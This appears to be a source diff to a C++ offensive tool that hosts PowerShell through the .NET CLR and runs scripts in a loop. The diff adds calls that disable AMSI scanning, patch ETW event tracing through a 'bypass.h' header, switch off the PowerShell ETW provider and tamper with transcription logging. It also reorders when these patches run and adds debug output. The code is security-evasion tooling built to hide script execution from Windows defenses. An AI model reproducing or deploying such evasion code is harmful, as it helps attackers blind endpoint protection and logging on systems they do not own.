@@ -6,6 +6,7 @@
 #include <string>
 #include <iostream>
 #include <propvarutil.h>
+#include "bypass.h"
 
 // Helper functions
 BOOL System_Object_GetType(CLR& clr, VARIANT vtObject, VARIANT* pvtType) {
@@ -895,8 +896,17 @@ void Patch(CLR& clr) {
         PRINT_ERROR("Failed to disable AMSI (2).\n");
     }
 
+    //if (!PatchEtw()) {
+    //    PRINT_ERROR("Failed to PatchEtwRet.\n");
+    //}
+
+    //if (!PatchEtwRet(clr)) {
+    //    PRINT_ERROR("Failed to PatchEtwRet.\n");
+    //}
+
     if (!DisablePowerShellEtwProvider(clr)) {
         PRINT_ERROR("Failed to disable ETW Provider.\n");
+        std::cout << "Failed to disable ETW Provider" << std::endl;
     }
 
     if (!PatchTranscriptionOptionFlushContentToDisk(clr)) {
@@ -962,6 +972,10 @@ int main() {
     VariantInit(&vtRunspaceProperty);
     long idx = 0;
     BOOL bHadErrors = FALSE;
+    //execute_debug_context();
+    if (!PatchEtw()) {
+        PRINT_ERROR("Failed to PatchEtwRet.\n");
+    }
 
     if (!clr.InitCLR()) {
         wprintf(L"[!] Failed to init CLR\n");
@@ -1031,7 +1045,6 @@ int main() {
         goto cleanup;
     }
 
-    Patch(clr);
 
     // Create runspace instance
     if (!clr.InvokeMethod(pMethodCreateRunspace, vtRunspace, NULL, &vtRunspace)) {
@@ -1046,12 +1059,20 @@ int main() {
         goto cleanup;
     }
 
+    Patch(clr);
+
     while (true) {
+
+        std::cout << GetThreadId(GetCurrentThread()) << std::endl;
         if (!clr.InvokeMethod(pMethodCreate, vtPSInstance, NULL, &vtPSInstance)) {
             wprintf(L"[!] Failed to create PowerShell instance\n");
             nRet = 0;
             goto cleanup;
         }
+
+        //if (!PatchEtw()) {
+        //    PRINT_ERROR("Failed to PatchEtwRet.\n");
+        //}
 
         //if (!clr.GetPropertyValue(pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtPSInstance, L"Runspace", &vtRunspaceProperty)) {
         //    wprintf(L"[!] Failed to get property Runspace\n");
@@ -1084,7 +1105,6 @@ int main() {
         pArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
         if (!pArgs) goto cleanup;
         if (FAILED(SafeArrayPutElement(pArgs, &idx, &vtScript))) goto cleanup;
-
         VariantClear(&vtResult);
         VariantInit(&vtResult);
         clr.InvokeMethod(pMethodAddScript, vtPSInstance, pArgs, &vtResult);
@@ -1099,7 +1119,6 @@ int main() {
         if (clr.InvokeMethod(pMethodInvoke, vtPSInstance, NULL, &vtResult)) {
             PrintPowerShellOutput(clr, vtResult);
         }
-
         if (!PowerShellHadErrors(clr, vtPSInstance, &bHadErrors))
             goto cleanup;
 
